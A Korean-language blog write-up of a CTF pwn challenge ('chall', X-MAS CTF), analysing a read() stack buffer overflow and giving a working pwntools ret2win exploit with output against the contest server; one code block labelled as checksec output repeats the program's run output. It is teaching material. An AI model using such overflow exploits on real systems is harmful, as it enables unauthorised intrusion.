풀문제는 chall 이라는 문제입니다

실행파일이 하나 주어지는데 이 실행파일을 실행시키면
<a href="https://drive.google.com/drive/folders/1wEr6WOyw9eP4oXkfhgaIMyXIQGriEoi7">실행파일 다운로드<.a<
```
root@kali:~/pwn/x# ./chall
Helloooooo, do you like to build snowmen?
test
Mhmmm... Boring...
```
입력칸이 열리고 입력을 하면 메세지를 출력합니다. 여기까지 보면 딱 버퍼 오버플로우라는게 감이 오죠.

제가 항상 분석 시작하기 전에 확인하는게 checksec 과 radare2 입니다

checksec 결과
```
root@kali:~/pwn/x# ./chall
Helloooooo, do you like to build snowmen?
test
Mhmmm... Boring...
```
radare2 결과
```
root@kali:~/pwn/x# radare2 chall
[0x00401070]> izz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x00000034 0x00000034   4  10 () utf16le @8\v@
001 0x000002a8 0x004002a8  27  28 (.interp) ascii /lib64/ld-linux-x86-64.so.2
002 0x00000409 0x00400409   9  10 (.dynstr) ascii libc.so.6
003 0x00000413 0x00400413   4   5 (.dynstr) ascii puts
004 0x00000418 0x00400418   5   6 (.dynstr) ascii stdin
005 0x0000041e 0x0040041e   4   5 (.dynstr) ascii read
006 0x00000423 0x00400423   6   7 (.dynstr) ascii stdout
007 0x0000042a 0x0040042a   7   8 (.dynstr) ascii setvbuf
008 0x00000432 0x00400432   6   7 (.dynstr) ascii strcmp
009 0x00000439 0x00400439  17  18 (.dynstr) ascii __libc_start_main
010 0x0000044b 0x0040044b  11  12 (.dynstr) ascii GLIBC_2.2.5
011 0x00000457 0x00400457  14  15 (.dynstr) ascii __gmon_start__
012 0x000010b5 0x004010b5   5   6 (.text) ascii H=@@@
013 0x00001269 0x00401269  11  12 (.text) ascii \b[]A\A]A^A_
014 0x00002010 0x00402010  30  31 (.rodata) ascii X-MAS{REAL FLAG ON THE SERVER}
015 0x00002030 0x00402030  41  42 (.rodata) ascii Helloooooo, do you like to build snowmen?
016 0x0000205e 0x0040205e  24  25 (.rodata) ascii Me too! Let's build one!
```
radare2 밑에 결과가 더 있었는데 그냥 불필요한 결과들이여서 잘랐어요.
여기서 알 수 있는 정보들은 nx 가 있기때문에 스택에 자체에서는 코드가 실행이 안된다는거죠. 
그리고 radare2 에서 출력된 정보들을 보면 플래그가 포함되있다는 것과 read 가 있는것을 보면 
딱 여기서 read를 이용한 오버플로우로 저 플래그를 출력 가능하다는 것을 알 수 있죠.

저는 막상 바이너리 분석 할때는 binaryninja 라는 디스어셈블리어를 씁니다. 현재는 무료 데모 버젼 
사용중인데 곧있으면 구매할 계획입니다.

main 코드는 전부 넣지 않고 필요한 코드들만 넣을게요.

일단 취약점이 발생하는 구간은
```
lea     rax, [rbp-0xa {var_12}]
mov     edx, 0x64
mov     rsi, rax {var_12}
mov     edi, 0x0
mov     eax, 0x0
call    read
```
아까 예상 햇듯이 read 구간입니다. read 함수는 많이 분석해보면 알 수 있는게 
함수를 부르기 전에 edx 에 버퍼 크기를 넣고 rsi 에는 변수를 넣어줘요.
그럼 여기서 
>read(fd, var_12, 0x64)

대충 이런식으로 변수 호출이 되는 것을 알 수 있죠.
그리고 var_12 는 [rbp-0xa] 에 위치해있는것을 알 수 있고요.
오프셋을 구할려면 gef의 pattern create 과 pattern search 를 쓰면 되긴 하는데
이 바이너리가 크기가 작기도 하고 다른 변수는 선언 안했을 거 같으니 0xa(10h) + 8 = 18가 
오프셋인것을 유추 할 수 있습니다. 여기서 8을 더해준 이유는 64bit는 8이 ret 까지 닿는 거리기 때문이에요
32bit는 4 인걸로 알고 있습니다.
마지막으로 알아야할것은 아까 X-MAS{} 플래그가 위치해 있는 곳을 알아내면 되는데 binaryninja에서
함수들좀 둘러보다 보니 이런 함수가 있네요.

```
sub_401156:
push    rbp {__saved_rbp}
mov     rbp, rsp {__saved_rbp}
mov     edi, 0x402010  {"X-MAS{REAL FLAG ON THE SERVER}"}
call    puts
nop     
pop     rbp {__saved_rbp}
retn     {__return_addr}

```
아이고 웬 떡입니까. 이런 문제는 그냥 거져에요.

이제 공격코드를 생각해보면 

>"A"*18+p64(0x401156) 

대충 이런식으로 넣으면 플래그가 출력될껄 조심히 유추 할 수 있습니다.

파이썬 코드
```
from pwn import *

r = process("./chall")

payload = b"A"*18
payload += p64(0x401156)

print(r.recvline())
r.sendline(payload)
print(r.recvline())



r.interactive()

```

실행 결과
```
root@kali:~/pwn/x# python exploit.py 
[+] Starting program './chall': Done
[ERROR] Neither 'qemu-i386' nor 'qemu-i386-static' are available
b'Helloooooo, do you like to build snowmen?\n'
b'Mhmmm... Boring...\n'
[*] Switching to interactive mode
X-MAS{REAL FLAG ON THE SERVER}
[*] Got EOF while reading in interactive
$  
```
전 그냥 습관이 들어서 코드 마지막에

>r.interactive()

를 넣어준건데 굳이 넣지 않으셔도 실행 잘 됩니다.

그럼이제 서버에 연결 시키면

```
root@kali:~/pwn/x# python exploit.py 
[+] Opening connection to challs.xmas.htsp.ro on port 12006: Done
b'Helloooooo, do you like to build snowmen?\n'
b'Mhmmm... Boring...\n'
[*] Switching to interactive mode
X-MAS{700_much_5n0000w}
[*] Got EOF while reading in interactive
$  
```
사실 이런문제는 난이도가 극하여서 쓸 이유는 없지만 포너블 하지 않으시는 분들도 이정도 문제만 풀줄
아시면 괜찮을 거 같아서 한번 작성해봤습니다.





